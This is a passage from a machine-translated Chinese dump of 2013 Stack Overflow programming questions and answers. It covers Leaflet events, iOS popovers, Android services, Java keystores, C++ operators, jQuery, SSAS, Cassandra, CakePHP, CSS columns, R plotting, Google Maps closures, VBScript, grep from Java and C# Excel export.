看来您需要了解的关键是`on`功能。它是一个传单函数，它接受 2 个参数，一个事件类型和一个回调函数，并将回调函数绑定到事件。然后回调函数在事件发生时运行，而不是之前。回调不会立即运行。相反，代码继续执行，并在事件发生时执行回调代码。

[文档`on`](http://leafletjs.com/reference.html#events)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T19:51:24.400

这就是所谓的[javascript事件循环](http://developer.yahoo.com/blogs/ydn/posts/2010/10/understanding-the-event-loops-and-writing-great-code-for-node-js-part-1/) “地图”之外的代码可以访问边界变量，但是您在定义地图的locationfound事件后立即尝试访问它-边界仅在此事件发生时才初始化-那么是什么您进入控制台只是您在 "bounds = "{}" 之前定义的一个空对象

您所做的是正确的-您只能在 locationfound 事件中访问边界，因为只有在初始化它之后

# ios - 调整 UIPopoverController 的大小

> ID：15533192
> 
> 赞同：1
> 
> 时间：2013-03-20T19:43:05.193
> 
> 标签：ios, objective-c, uitableview, uipopovercontroller

我有一个 UIPopoverController。我在其中放置了一个带有两个 UITableViewcontroller 的 UINavigationController。

我创建了一个子类 UITableView，我可以设置弹出框的大小`tableView.contentSizeForViewInPopover`：

```
if (self.myPopoverController.isPopoverVisible)
{
    [self.myPopoverController dismissPopoverAnimated:YES];
}
else
{
    MyRootTableView *rootTableView = [[MyRootTableView alloc]initWithStyle:UITableViewStyleGrouped];
    MyRootTableView.contentSizeForViewInPopover = CGSizeMake(POPOVER_SIZE.width, [self createContentHeighForTableViewController:tableView]);
    MyRootTableView.boundaryDelegate = self;

    UINavigationController *navController = [[UINavigationController alloc] initWithRootViewController:tableViewController];
    navController.modalTransitionStyle = UIModalTransitionStyleCoverVertical;
    navController.navigationBar.barStyle = UIBarStyleBlack;

    self.myPopoverController = [[UIPopoverController alloc] initWithContentViewController:navController];
    self.myPopoverController.delegate = self;

    [self.myPopoverController presentPopoverFromRect:frame inView:view permittedArrowDirections:arrowDirection animated:YES];
} 
```

在 rootTableViewController 的 didSelectRowAtIndexPath 中：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    DetailedTableViewController *tableViewController = [[DetailedTableViewController alloc] initWithStyle:UITableViewStyleGrouped];
    tableViewController.contentSizeForViewInPopover = CGSizeMake(POPOVER_SIZE.width, [self createContentHeighForTableViewController:tableViewController]);
    tableViewController.delegate = self.boundaryDelegate;

    [self.navigationController pushViewController:tableViewController animated:TRUE];
} 
```

`createContentHeightForTableViewController:`计算在表格视图中显示所有单元格所需的高度

所以对于根tableViewController，我设置了内容大小。当我创建详细视图控制器时，我将其设置`contentSizeForViewInPopover`为不同的大小。这很好用。我遇到的问题是当我导航回根表视图时，`contentSizeForViewInPopover`仍然为详细表视图设置。

当表格视图显示或出现时，如何调整弹出框的大小？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-02-13T11:17:39.177

尝试使用`preferredContentSize`而不是`contentSizeForViewInPopover`在您的`tableViewController`（`contentSizeForViewInPopover`在 iOS7 上已弃用）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:12:17.747

您应该`popoverContentSize`直接在父视图控制器的 viewWillAppear 方法中设置 UIPopoverController（或其他适当的位置）。无论您想在哪里强制更新弹出框的内容大小。

# android - 从android中的对话框启动服务

> ID：15533198
> 
> 赞同：1
> 
> 时间：2013-03-20T19:43:17.423
> 
> 标签：android, android-service, android-dialog

我正在尝试从弹出对话框启动后台服务，但它对我不起作用

这是打开对话框的代码：

```
reportWrongLang.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {
            FragmentManager fm = getFragmentManager();
            ReportWrongLangDialog Dialog = new ReportWrongLangDialog(imageInfo.getParam("imageId")[0], getApplicationContext());
            Dialog.show(fm, "are_you_sure_dialog");
        } 
```

在 ReportWrongLangDialog 我保存 appContext 和 imageId

在按下报告按钮时的对话框中，我想启动将报告图像的后台服务

onClick 的代码

```
report.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            System.out.println("got imageid: " + imageId);
            Intent intent = new Intent(appContext, ReportImageService.class);
            intent.putExtra("ReportType", "IMAGE_REPORT");
            intent.putExtra("ImageID", imageId);
            intent.putExtra("Extra", "2");
            appContext.startService(intent);
            System.out.println("after service start");
        }
    }); 
```

其中 ReportImageService.class 是我要启动的服务。当我按下报告按钮时没有任何反应..

可能是什么问题？我只能假设 applicationContext 有问题

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T21:31:53.507

我的应用程序遇到了同样的问题。对我有用的解决方案是：与其传递您的上下文并稍后使用它（使用 getContextApplication() 方法），还有另一种方法可以做到这一点，通过：

> YourActivityName.this

作为您的上下文，然后从此对象调用您的 startService() 方法。

# java - 我如何知道哪个别名包含 Java 密钥库中的证书和私钥？

> ID：15533199
> 
> 赞同：2
> 
> 时间：2013-03-20T19:43:19.960
> 
> 标签：java, keystore, keytool, jks

我需要从我们的 JKS 密钥库中提取我们的 SSL 证书和私钥，并将其发送给我们正在与之交互的第三方供应商。创建密钥库并导入证书的人不再在公司工作，所以我不知道我具体需要使用哪个别名。

证书和私钥会从同一个别名中提取吗？我的密钥库中有 5 个别名。3 个日期为 2010 年，2 个日期为 2012 年。2012 别名的条目类型为 PrivateKeyEntry 和trustedCertEntry。2010 年的 3 个是trustedCertEntry。所有 5 个都在有效日期范围内，表明没有一个过期。

我的理解是 PrivateKeyEntry 包含私钥和证书链？这是否意味着证书和私钥都应该从同一个别名中提取？

我在这里没有太多出错的余地，并想确保我完全理解我正在导出和发送的内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:48:37.420

用于证书的别名不必与私钥对应。所以，你必须抓住机会。

**编辑：**

我还没有真正尝试过。但这真的不重要，因为证书取决于公钥 - 私钥。密钥库中提供的密码只是保护它们并将其仅提供给受信任用户的一种方式。因此，我建议您生成证书并使用 getEncoded 方法将它们与其他证书进行比较。这会给你二进制文件，你可以比较它们。

# c++ - 错误与“操作员*”不匹配

> ID：15533200
> 
> 赞同：2
> 
> 时间：2013-03-20T19:43:20.543
> 
> 标签：c++, operator-overloading, operator-precedence

我有一门进行十进制计算的课程。我有所有的数学运算符重载。它适用于相当简单的计算，但当我需要添加括号时会失败。例如，以下两种计算都可以工作并得到正确的结果：

```
myClass r, a = 100000, b = 2.5, c = 10, d = 30;
r = c / d * a * b;
r = (c / d) * a * b; 
```

但是如果我将计算更改为`r = a * b * (c / d);`编译失败：

```
error: no match for ‘operator*’ in ‘myClass::operator*(myClass&)((* & b)) * myClass::operator/(myClass&)((* & d))’ in gcc 4.6.2. 
```

我可能错过了一些简单的东西，但找不到。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T03:48:55.807

正如几乎每个人所猜测的那样，问题在于缺少`const`预选赛。还有一个因素是返回的是副本而不是参考。

有问题的无效代码是这样的：

```
myClass operator *= (myClass &num) { return Mul(num); }
myClass operator * (myClass &num) { return Mul(num); } 
```

更正后的版本：

```
myClass& operator *= (const myClass &num) { Mul(num); return *this; }
friend myClass operator * (const myClass &num1, const myClass &num2) { myClass tmp(num1) tmp.Mul(num2); return tmp; } 
```

# javascript - 创建一个淡入白色的页面过渡，但这似乎不起作用

> ID：15533201
> 
> 赞同：0
> 
> 时间：2013-03-20T19:43:21.087
> 
> 标签：javascript, jquery

```
</script>
<script type="text/javascript" src ="js/jquery-1.7.2.min.js"></script>
<script type ="text/javascript">
        $(document).ready(function() {
            $("Natwest").css("display", "none");
            $("Natwest").fadeIn(2000);
    });
</script> 
```

这有什么错误吗？我正在创建一个页面过渡，它逐渐变为白色，但我编写的代码似乎不起作用。

Natwest 是一个 CSS 类。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:45:22.527

我认为

`$("Natwest")`应该是`$("#Natwest")`或`$(".Natwest")`。

所以 if `Natwest`is `ID`then`#Natwest`的 if `class`then `.Natwest`。

**但**

你正在尝试的是`<Natwest>`不可能的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T19:45:40.700

您可能希望将 id 选择器用于`#`：

```
$("#Natwest").css("display", "none");
$("#Natwest").fadeIn(2000);
// if your element looks like this: <div id="Natwest"></div>" 
```

$("Natwest") 查找`<Natwest>`页面上的所有标签 - 可能没有，因为它不是标准标签。

`#`[通过 id](http://api.jquery.com/id-selector/)选择一个元素。[按类名](http://api.jquery.com/class-selector/)`.`选择一个元素。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T19:46:49.067

`$("Natwest")`如果它的 Natwest 是您使用的类`$(".Natwest")`或者它是您使用的 ID，则您不能使用`$("#Natwest")`

# excel - 在 Excel 中折叠组时计算的成员消失

> ID：15533202
> 
> 赞同：1
> 
> 时间：2013-03-20T19:43:21.637
> 
> 标签：excel, ssas

我正在使用 Excel 2010 和 SQL Analysis Services 2008 R2。我创建了一个计算成员，将总数相加。它如下所示并且工作正常。

CalcMember = [Product].[Product].defaultmember - 聚合（[Product].[Product].&[Test]）

我已将父层次结构设置为 [Product].[Product]，将父成员设置为 [All]。当我在 Excel 中查看它时，它看起来不错。但是，如果我折叠包含计算成员的组，它就会消失。如果我展开组，则会出现计算的成员。例如：

```
Expand
 Year
  - 2010
     Product1    50
     CalcMember  75
  - 2011
     Product2    25
     CalcMember  60

Collapse
 Year
   + 2010
   - 2011
     Product2    25 
```

为什么 CalcMember 从 2011 年开始消失？如何让它不消失？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T01:03:05.387

Excel 不能很好地与计算成员配合使用。我会在产品维度中添加一个“真正的”成员，例如使用联合。然后，我将使用 SCOPE 分配来执行计算，而不是定义计算成员。

# cassandra - Astyanax“java.lang.NoClassDefFoundError：org/apache/cassandra/dht/Murmur3Partitioner”异常

> ID：15533203
> 
> 赞同：0
> 
> 时间：2013-03-20T19:43:25.543
> 
> 标签：cassandra, noclassdeffounderror

我创建了一个 maven 项目，用于连接 cassandra 数据库并通过 cassandra astyanax java 客户端插入数据。

maven clean and install builds成功但是当我运行这个java应用程序时出现以下错误

```
Exception in thread "main" java.lang.NoClassDefFoundError: org/apache/cassandra/dht/Murmur3Partitioner
    at com.netflix.astyanax.impl.AstyanaxConfigurationImpl.<init>(AstyanaxConfigurationImpl.java:55)
    at ConnectingAstyanax.cassandraConnection(ConnectingAstyanax.java:23)
    at ConnectingAstyanax.main(ConnectingAstyanax.java:66)
Caused by: java.lang.ClassNotFoundException: org.apache.cassandra.dht.Murmur3Partitioner
    at java.net.URLClassLoader$1.run(URLClassLoader.java:366)
    at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:356) 
```

pom.xml如下

```
 <modelVersion>4.0.0</modelVersion>
  <groupId>CassandraAstyanax</groupId>
  <artifactId>CassandraAstyanax</artifactId>
  <version>0.0.1-SNAPSHOT</version>
  <build>
    <sourceDirectory>src</sourceDirectory>
    <plugins>
      <plugin>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>2.3.2</version>
        <configuration>
          <source>1.7</source>
          <target>1.7</target>
        </configuration>
      </plugin>
    </plugins>
  </build>
  <dependencies>
        <dependency>
              <groupId>com.netflix.astyanax</groupId>
              <artifactId>astyanax-thrift</artifactId>
              <version>1.56.31</version>
              </dependency>
              <dependency>
              <groupId>com.netflix.astyanax</groupId>
              <artifactId>astyanax-core</artifactId>
              <version>1.56.31</version>
              </dependency>
              <dependency>
              <groupId>com.netflix.astyanax</groupId>
              <artifactId>astyanax-cassandra</artifactId>
              <version>1.56.31</version>
              </dependency>
              <dependency>
                <groupId>org.apache.cassandra</groupId>
                <artifactId>cassandra-thrift</artifactId>
                <version>1.1.2</version>
            </dependency>
            <dependency>
                <groupId>org.apache.cassandra</groupId>
                <artifactId>cassandra-all</artifactId>
                <version>1.1.2</version>
            </dependency>

  </dependencies>
</project> 
```

任何帮助解决错误将不胜感激..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T12:29:35.590

Murmur3Partitioner 是在 Cassandra 1.2 中引入的。您需要更新您的 pom 以引入 1.2 版本而不是 1.1。

# javascript - 如何在javascript中取消选择/取消焦点文本字段

> ID：15533204
> 
> 赞同：0
> 
> 时间：2013-03-20T19:43:25.783
> 
> 标签：javascript, ios, xcode

我有一个移动网络应用程序，我希望在用户单击发送后取消选择文本字段，因为现在当用户单击发送时，ios 键盘会立即恢复，并且很难判断消息是否通过。

链接到网络应用程序 www.306radio.ca/mobile/chat

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:52:15.040

您可以`blur()`在文本字段上使用来隐藏键盘，也可以`focus()`在非文本字段项目上使用，例如提交按钮。

出现问题是因为在用户单击发送后焦点返回到文本字段。

# session - Cakephp tmp 目录：缓存和会话文件夹

> ID：15533207
> 
> 赞同：3
> 
> 时间：2013-03-20T19:43:39.903
> 
> 标签：session, cakephp, caching, tmp

有人可以向我解释一下这些目录中存储了哪些类型的数据吗？

例如，我现在有一个活动会话（带有身份验证）但会话目录是空的？

缓存文件夹中的文件夹（模型、持久性、视图）中究竟存储了什么？

例如，在持久文件夹中，我有一个名为“myapp_cake_core_cake_dev_en-us”的文件，如果我打开它，我可以看到：

```
1363808159
a:1:{s:11:"LC_MESSAGES";a:0:{}} 
```

请尽可能具体。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-20T20:51:01.020

我会尝试描述他们的内容（我的脑海里，所以我可能错过了一些）

`app/tmp/logs/`

包含 CakePHP 生成的各种日志文件

`app/tmp/sessions/`

**如果使用 'Cake' 作为会话处理程序**，则包含您网站的会话如果使用`php`或`database`会话处理程序，则此目录将为空。可以在您的`app/Config/core.php`配置中配置会话处理程序

`app/tmp/cache/models`

将包含模型缓存；CakePHP 将缓存数据库表的模式定义，这样就不需要在每次使用时从数据库中获取该信息。

`app/tmp/cache/persistent`

将包含有关类/对象位置和解析的“语言环境”文件的缓存信息。此信息将防止 CakePHP 必须扫描所有目录来查找/加载控制器、帮助程序等。

tmp/Cache 目录可能包含其他文件，例如，如果您使用“视图”缓存或其他（自定义）缓存，这是存储这些缓存信息的最可能位置。

## 缓存引擎

缓存目录将仅用于`File`缓存机制。也可以使用其他缓存机制，例如`Apc`或`Memcached`. 这些缓存机制会将缓存的信息保存在服务器的内存 (RAM) 中，这样会快很多。

在此处阅读 CakePHP 中的缓存引擎：

[http://book.cakephp.org/2.0/en/core-libraries/caching.html](http://book.cakephp.org/2.0/en/core-libraries/caching.html)

# css - 堆叠 div，但让它们以固定高度包装

> ID：15533208
> 
> 赞同：1
> 
> 时间：2013-03-20T19:43:45.157
> 
> 标签：css, horizontal-scrolling

我有一个 DIV 列表，它们相互堆叠。基本上它们不是浮动的。

高度固定为 500 像素，一旦 DIV 到达底部，我希望它们从下一列开始。因此，对于大约 200 个项目，您只需水平滚动即可查看 div 而不是垂直滚动。

DIV 的数量可能非常大，理想情况下，我希望在调整屏幕大小时推动行。所以没有固定的行，它们彼此相邻浮动。

```
<div class="row show-grid">
    <div class="span1 span1-nofloat">Item 1</div>
    <div class="span1 span1-nofloat">Item 1</div>
    <div class="span1 span1-nofloat">Item 1</div>
    <div class="span1 span1-nofloat">Item 1</div>
</div>

.span1 {
width: 60px;
}

.span1-nofloat {
    float: none;
} 
```

![在此处输入图像描述](../Images/f037d66d6e79889c1d97ea823ddbc925.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T21:13:15.303

使用 CSS3 列来实现使用 CSS 的流动列布局怎么样？毕竟，这就是 CSS 列的设计目的。在列布局中使用通常是块级的元素来实现这种效果的技巧是应用于`display: inline-block`内部元素。像这样的东西会用固定宽度的较小的 div 从上到下、从左到右填充 div。

CSS：

```
.columns div {
    width: 60px;
    height: 70px;
    background-color: blue;
    margin-bottom: 5px;
    display: inline-block;
}

.columns {
    overflow-x: scroll;
    padding: 5px 5px 0 5px;
    height: 242px;
    -moz-column-width: 65px;
    -webkit-column-width: 65px;
    column-width: 65px;
    -moz-column-gap: 0;
    -webkit-column-gap: 0;
    column-gap: 0;
    background-color: red;
} 
```

和 HTML：

```
<div class="columns">
    <div>Item</div>
    <div>Item</div>
    <div>Item</div>
    <div>Item</div>
    <div>Item</div>
</div> 
```

如果您的 div 高度相同并且您想要一致的下边距，则尺寸可能有点繁琐，但您可以在几分钟内使用计算器通过将每个盒子的大小相加来计算出适合您的特定情况元素。如果你的盒子的高度会有所不同，只要确保它们都不和包含元素一样高或更高，否则它的内容会环绕到下一列；这确实是正确的行为（您不想隐藏您的内容，对吗？）但它有点难看。

[这是一个演示这个想法的小提琴](http://jsfiddle.net/WGScP/4/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:40:05.033

这是使用 CSS3 转换的解决方案：[jsfiddle](http://jsfiddle.net/opherv/yk566/)

这个想法是你从普通的“浮动盒子”开始，好像它们是水平堆叠的，但随后容器会转换为`rotate(-90deg)`，以便盒子垂直堆叠。为了纠正现在不正确的盒子内容方向，将它们转换回`rotate(90deg)`.

因此盒子容器的宽度实际上定义了它的最终高度。尝试添加或减去盒子项目，您会注意到盒子从左到右垂直堆叠:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:27:36.253

首先，HTML。我所做的只是向容器添加一个 ID，这样我就可以轻松地获得对它的引用：

```
<div class="row show-grid" id="gridcontainer">
    <div class="span1 span1-nofloat">Item 1</div>
    <div class="span1 span1-nofloat">Item 1</div>
    ....
    <div class="span1 span1-nofloat">Item 1</div>
    <div class="span1 span1-nofloat">Item 1</div>
</div> 
```

然后是 CSS。我为`.span1`类设置了边框和间距，以便更容易看到：

```
.span1 {
    width: 60px;
    border: solid 1px #ccc;
    padding: 20px;
}

.span1-nofloat {
    float: none;
}

.show-grid{
    max-height: 220px;
    overflow: auto;
    white-space: nowrap;
}

.show-column{
    display: inline-block;
    vertical-align: top;
} 
```

最后是javascript。从您的 onload 事件中运行它，或者在 HTML 加载后直接运行。我只是把它放在一起，所以它可能可以改进很多：

```
var maxheight = 200;
var container = document.getElementById('gridcontainer');
var columns = [document.createElement('div')];
columns[0].className = 'show-column';
var currentcolumn = columns[0];
var currentheight = 0;
var count = container.childNodes.length;
for(var i=0;i<count;i++){
    var child = container.childNodes[0];
    var height = child.offsetHeight | 0;
    if(currentheight + height > maxheight){
        currentcolumn = document.createElement('div');
        currentcolumn.className = 'show-column';
        columns.push(currentcolumn);
        currentheight = 0;
    }
    currentcolumn.appendChild(child);
    currentheight += height;
}
container.innerHTML = '';
for(var j=0;j<columns.length;j++){
     container.appendChild(columns[j]);   
} 
```

该`maxheight`变量是容器的最大高度，在 JavaScript 中设置为比 CSS 小 20px，因此容器有空间用于水平滚动条。

解决方案的 JSFiddle：http: [//jsfiddle.net/djBK3/](http://jsfiddle.net/djBK3/)

# r - 如何连接有缺失值的点？

> ID：15533212
> 
> 赞同：10
> 
> 时间：2013-03-20T19:43:57.643
> 
> 标签：r, plot

让我们举个例子：

```
 test=c(1,5,NA,5,4,1,NA,3,3,5,4,2)

      plot(test,type="l") 
```

这将绘制测试，但不会连接点。有没有办法我们可以忽略 NA 并连接点，以便我们得到漂亮的图表？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-20T19:46:24.177

一种选择是：

```
plot(na.omit(test), type = "l") 
```

如果要保留从 1 开始的 x 轴，`length(test)`则：

```
plot(na.omit(cbind(x = seq_along(test), y = test)), type = "l") 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-03-20T19:53:37.937

没有办法忽略缺失值。您需要用插值替换它们。

```
# using base packages only
plot(approx(test, xout=seq_along(test))$y, type="l")
# or, using zoo
library(zoo)
plot(na.approx(test), type="l") 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-03-20T20:25:33.470

在相同位置保留缺失值的另一种方法

```
data=data.frame(x=1:12,y=test)
plot(data)
lines(data)
lines(na.omit(data),col=2) 
```

或者在 ggplot2

```
ggplot(data,aes(x,y))+geom_point()+geom_line(data=na.omit(data)) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-05-11T02:23:07.173

您必须使用上述解决方案忽略 NA，`na.omit()`或者尝试用合理的值替换 NA - 您可以为此使用包 imputeTS。

你可以例如插值：

```
library(imputeTS)
imp <- na_interpolation(test)
plot(imp, type="l") 
```

您可以将平均值作为替换：

```
library(imputeTS)
imp <- na_mean(test)
plot(imp, type="l") 
```

您也可以将移动平均线作为替代：

```
library(imputeTS)
imp <- na_ma(test)
plot(imp, type="l") 
```

最后，使用最适合您的用例的东西是有意义的。通常这将“忽略”NA - 因为插值/插补只是对实际值的估计，并且还需要选择正确的方法。

# javascript - 我应该如何重组我的 addEventListener？

> ID：15533213
> 
> 赞同：0
> 
> 时间：2013-03-20T19:44:00.140
> 
> 标签：javascript, google-maps-api-3, dom-events, addeventlistener

我正在使用谷歌地图的 API。我有一组标记和一组信息窗口，我试图在单击标记时显示相应的信息窗口。我无法理解我应该如何添加我的事件侦听器，以便它尊重 JavaScript 闭包。

（不正确）代码，所有这些都包含在`initialize()`页面加载时调用的代码中：

```
var markers = []
var infoWindows = []

[define all markers and info windows here, long so cut]

for (var i = 0; i < markers.length; i++)
{
    google.maps.event.addListener(markers[i], 'click', function() {
        infoWindows[i].open(mymap, markers[i]);
    });
} 
```

在来到这里之前，我已确保我的所有对象都已正确初始化。

我对我的问题的理解是，当点击事件发生时，`infoWindows[i]`不再可以访问。我该怎么做才能让`eventListener`我认为它应该工作，`infoWindow`数组中第 i 个位置的位置对应于第 i 个位置的标记？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:02:28.857

您是对的，因为 的值已更新，`infoWindows[i]`因此不再可访问。`i`

解决此问题的一种方法是使用`.forEach`：

```
markers.forEach(function(value, i){
    google.maps.event.addListener(markers[i], 'click', function() {
        infoWindows[i].open(mymap, markers[i]);
    });
}) 
```

在这种情况下，每个事件侦听器的 i 变量位于不同的函数中。您当前的代码`i`每次都使用相同的变量，并且`i`每个事件侦听器中的变量都是相同的。在分配了所有事件侦听器后`i`，它仍保持其最终值并`markers[i]`引用列表中的最后一个标记。

查看[此问题](https://stackoverflow.com/questions/750486/javascript-closure-inside-loops-simple-practical-example)以获取替代解决方案。

# loops - 如何在 VB 脚本中逐行读取文件？

> ID：15533214
> 
> 赞同：20
> 
> 时间：2013-03-20T19:44:00.337
> 
> 标签：loops, vbscript, readfile

我有以下内容逐行读取文件：

```
wscript.echo "BEGIN"

filePath = WScript.Arguments(0)
filePath = "C:\Temp\vblist.txt"
Set ObjFso = CreateObject("Scripting.FileSystemObject")
Set ObjFile = ObjFso.OpenTextFile(filePath)
StrData = ObjFile.ReadLine
wscript.echo "END OF FIRST PART"

Do Until StrData = EOF(ObjFile.ReadLine)
    wscript.echo StrData
    StrData = ObjFile.ReadLine
Loop

wscript.echo "END" 
```

该`EOF()`功能似乎不起作用：

```
C:\Users\EGr\Documents\Scripts\VB>cscript testloop.vbs ArgVal
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.

BEGIN
END OF FIRST PART
C:\Users\EGr\Documents\Scripts\VB\testloop.vbs(11, 1) Microsoft VBScript runti
me error: Type mismatch: 'EOF' 
```

我以前没有在 VB 中编程，但我正在尝试找出循环，以便我可以修改我收到的 VB 脚本。我想逐行读取文件，并对每一行做一些事情。如果我将 Do Until 循环更改为`Do Until StrData = EOF`，它可以工作，但在到达文件末尾时会引发错误：

```
C:\Users\EGr\Documents\Scripts\VB>cscript testloop.vbs ThisRANDOMValue
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.

BEGIN
1
END OF FIRST PART
host1
host2
host3
C:\Users\EGr\Documents\Scripts\VB\testloop.vbs(13, 2) Microsoft VBScript runti
me error: Input past end of file 
```

我觉得可能有一个简单的解决方案，但我一直无法找到它。我尝试了一些我在网上找到的其他解决方案，但没有像上面那样接近。

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2013-03-20T19:49:58.703

如有疑问，请阅读[文档](http://msdn.microsoft.com/en-us/library/314cz14s%28v=vs.84%29.aspx)：

```
filename = "C:\Temp\vblist.txt"

Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(filename)

Do Until f.AtEndOfStream
  WScript.Echo f.ReadLine
Loop

f.Close 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-11-24T10:05:59.693

如果像我这样的人正在搜索仅读取特定行，则仅示例第 18 行是代码：

```
filename = "C:\log.log"

Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(filename)

For i = 1 to 17
    f.ReadLine
Next

strLine = f.ReadLine
Wscript.Echo strLine

f.Close 
```

# java - Java 执行 grep | linux失败

> ID：15533215
> 
> 赞同：0
> 
> 时间：2013-03-20T19:44:14.470
> 
> 标签：java, regex, grep

已解决请参阅下面的评论

好的，这个很棘手：

我从 Java 调用这个命令`Process.exec()`：

```
grep -ne 'xxx\|yyy' file 
```

它只返回`xxx`？

编辑：我在java中转义了`\`。`\\`

但是，当我从同一台机器上的命令行调用完全相同的命令时，它会返回`xxx`并按`yyy`预期返回！？

我已经尝试了一切，越来越少地转义`-E`，更改`'`为`"`（当您从 java 运行时，这实际上也不起作用）？！

有人遇到完全相同的奇怪问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:07:45.147

这可能是一个愚蠢的问题，但为什么不使用 BufferedReader/ [readLine](http://docs.oracle.com/javase/1.5.0/docs/api/java/io/BufferedReader.html#readLine%28%29)，然后使用 String.indexOf 或其他正则表达式，而不是使用 grep 呢？

Grep 在搜索文件方面可能比 Java 快，但另一方面，从 Java 创建子进程可能会抵消在那里获得的任何好处。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T19:51:03.600

您必须通过按如下方式输入 '\\' 来转义 '\'：

```
.exec("grep -ne 'xxx\\|yyy' file"); 
```

# c# - 将 Button 网格数组导出到 Ms Excel

> ID：15533217
> 
> 赞同：0
> 
> 时间：2013-03-20T19:44:15.867
> 
> 标签：c#, winforms, visual-studio-2010, excel, export-to-excel

您好我有一个使用按钮数组生成网格的小程序。单击按钮时，它们会改变颜色。我怎样才能将这个布局准确地导出到 Excel 女士中，它在表单上的样子甚至可能吗？我希望 Excel 中的单元格代表按钮

我的程序如下所示：![在此处输入图像描述](../Images/d10697e3c4a00ce8d2d973e072506a31.png)

我如何创建我的网格：

```
int col = 7;
int row = 4;
int count = 0;
Button[][] buttons;

public void placeRows()
        {
            for (int r = 0; r < row; r++)
            {
                createColumns(r);
            }
        }

        public void createColumns(int r)
        {
            int s = r * 25; //gap
            for (int c = 0; c < col; c++)
            {
                buttons[r][c] = new Button();
                buttons[r][c].SetBounds(75 * c, s, 75, 25);
                buttons[r][c].Text = Convert.ToString(c);
                buttons[r][c].Click += new EventHandler(grid_Click);
                panel1.Controls.Add(buttons[r][c]);
            }
        }

private void Form1_Load(object sender, EventArgs e)
        {
            placeRows();
        }

 void grid_Click(object sender, EventArgs e)
         {
             Button button = sender as Button;

             if (count == 0)
             {
                 button.BackColor = Color.Red;
                 count++;
             }

             else if (count == 1)
             {
                 button.BackColor = Color.Blue;
                 count--;
             }
         }

private void btnExport_Click(object sender, EventArgs e)
         {
             //have no idea how to start this

         } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T21:21:15.173

您可以使用 Microsoft Excel COM 组件。

首先，您必须添加 Microsoft Excel XX.X 对象库作为参考（在我的情况下，我使用的是 12.0）。

下面的代码包含简单的类，它使用按钮数组中的数据创建新的工作表。如果你想保存你的工作空间，你应该`app.SaveWorkspace(excelName);`在`Do`方法中取消注释。

```
using Microsoft.Office.Interop.Excel;

namespace SimpleExcelExport
{
    class Export
    {
        public Export(bool defaultBackgroundIsWhite)
        {
            this.defaultBackgroundIsWhite = defaultBackgroundIsWhite;

            app = new Application();
            app.Visible = true;
            workbook = app.Workbooks.Add(1);
            worksheet = (Worksheet)workbook.Sheets[1];
        }       

        public void Do(string excelName, System.Windows.Forms.Button[][] array)
        {
            for (int i = 0; i <= array.GetUpperBound(0); i++)
            {
                for (int j = 0; j <= array[i].GetUpperBound(0); j++)
                {
                    AddData(i, j, array[i][j]);
                }
            }

            //app.SaveWorkspace(excelName);
        }            

        private void AddData(int row, int col, System.Windows.Forms.Button button)
        {
            if (button == null) return;
            row++;
            col++;
            Range range = worksheet.Cells[row, col];
            if (!defaultBackgroundIsWhite)
            range.Interior.Color = button.BackColor.ToArgb();
            else
                range.Interior.Color = button.BackColor.Name != "Control" ? button.BackColor.ToArgb() : System.Drawing.Color.White.ToArgb();
            range.NumberFormat = "";
            worksheet.Cells[row, col] = button.Text;
        }

        private Application app = null;
        private Workbook workbook = null;
        private Worksheet worksheet = null;
        private Range workSheet_range = null;
        private bool defaultBackgroundIsWhite;
    }
} 
```

使用示例：

```
private void btnExport_Click(object sender, EventArgs e)
{
    Export ep = new Export(true);
    ep.Do("test.xsl", buttons);
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-20T19:47:47.003

你需要做的是创建一些数据准备好使用的数组，这样你就可以做两件事：

1.  根据该数组生成按钮。
2.  将此数组导出到 MS Excel，如[CSV](http://en.wikipedia.org/wiki/Comma-separated_values)。

所以放弃那条线

```
panel1.Controls.Add(buttons[r][c]); 
```

并用数据填充您的数组。

# c# - 对绑定到类的单击事件使用上下文

> ID：15533222
> 
